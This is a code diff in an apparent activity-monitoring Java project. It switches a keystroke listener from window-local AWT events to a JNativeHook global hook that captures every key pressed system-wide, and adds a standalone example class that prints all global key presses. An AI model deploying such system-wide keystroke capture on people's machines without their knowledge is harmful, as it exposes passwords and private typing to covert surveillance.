@@ -5,6 +5,10 @@ import com.example.activitymonitor.monitoring.domain.MonitoringPoint;
 import com.example.activitymonitor.monitoring.domain.points.KeyLoggerMonitoringPoint;
 import com.example.activitymonitor.report.application.visitor.ReportVisitor;
 import com.example.activitymonitor.report.domain.Report;
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
 
 import java.awt.*;
 import java.awt.event.KeyEvent;
@@ -29,32 +33,34 @@ public class KeyLoggerMonitoringService implements Monitoring {
     public Stream<MonitoringPoint> startMonitoring(boolean isMonitoringStarted) {
         BlockingQueue<KeyLoggerMonitoringPoint> keyEventsQueue = new LinkedBlockingQueue<>();
 
-        KeyListener keyListener = new KeyListener() {
+        NativeKeyListener nativeKeyListener = new NativeKeyListener() {
             @Override
-            public void keyTyped(KeyEvent e) {
-            }
-
-            @Override
-            public void keyPressed(KeyEvent e) {
+            public void nativeKeyPressed(NativeKeyEvent e) {
                 if (isMonitoringStarted) {
-                    keyEventsQueue.add(new KeyLoggerMonitoringPoint(String.valueOf(e.getKeyChar())));
+                    keyEventsQueue.add(new KeyLoggerMonitoringPoint(NativeKeyEvent.getKeyText(e.getKeyCode())));
                 }
             }
 
             @Override
-            public void keyReleased(KeyEvent e) {
+            public void nativeKeyReleased(NativeKeyEvent e) {
+                // Implement as needed
+            }
+
+            @Override
+            public void nativeKeyTyped(NativeKeyEvent e) {
+                // Implement as needed
             }
         };
 
-        // Add the key listener to the AWT event queue
-        Toolkit.getDefaultToolkit().addAWTEventListener(e -> {
-            if (e instanceof KeyEvent) {
-                KeyEvent keyEvent = (KeyEvent) e;
-                if (keyEvent.getID() == KeyEvent.KEY_PRESSED) {
-                    keyListener.keyPressed(keyEvent);
-                }
-            }
-        }, AWTEvent.KEY_EVENT_MASK);
+        try {
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException ex) {
+            System.err.println("There was a problem registering the native hook.");
+            System.err.println(ex.getMessage());
+            System.exit(1);
+        }
+
+        GlobalScreen.addNativeKeyListener(nativeKeyListener);
 
         return Stream.generate(() -> {
             try {
@@ -64,5 +70,32 @@ public class KeyLoggerMonitoringService implements Monitoring {
                 return null;
             }
         });
+    }
+}
+class GlobalKeyListenerExample implements NativeKeyListener {
+
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+    }
+
+    public void nativeKeyReleased(NativeKeyEvent e) {
+        // Implement as needed
+    }
+
+    public void nativeKeyTyped(NativeKeyEvent e) {
+        // Implement as needed
+    }
+
+    public static void main(String[] args) {
+        try {
+            GlobalScreen.registerNativeHook();
+        }
+        catch (NativeHookException ex) {
+            System.err.println("There was a problem registering the native hook.");
+            System.err.println(ex.getMessage());
+            System.exit(1);
+        }
+
+        GlobalScreen.addNativeKeyListener(new GlobalKeyListenerExample());
     }
 }
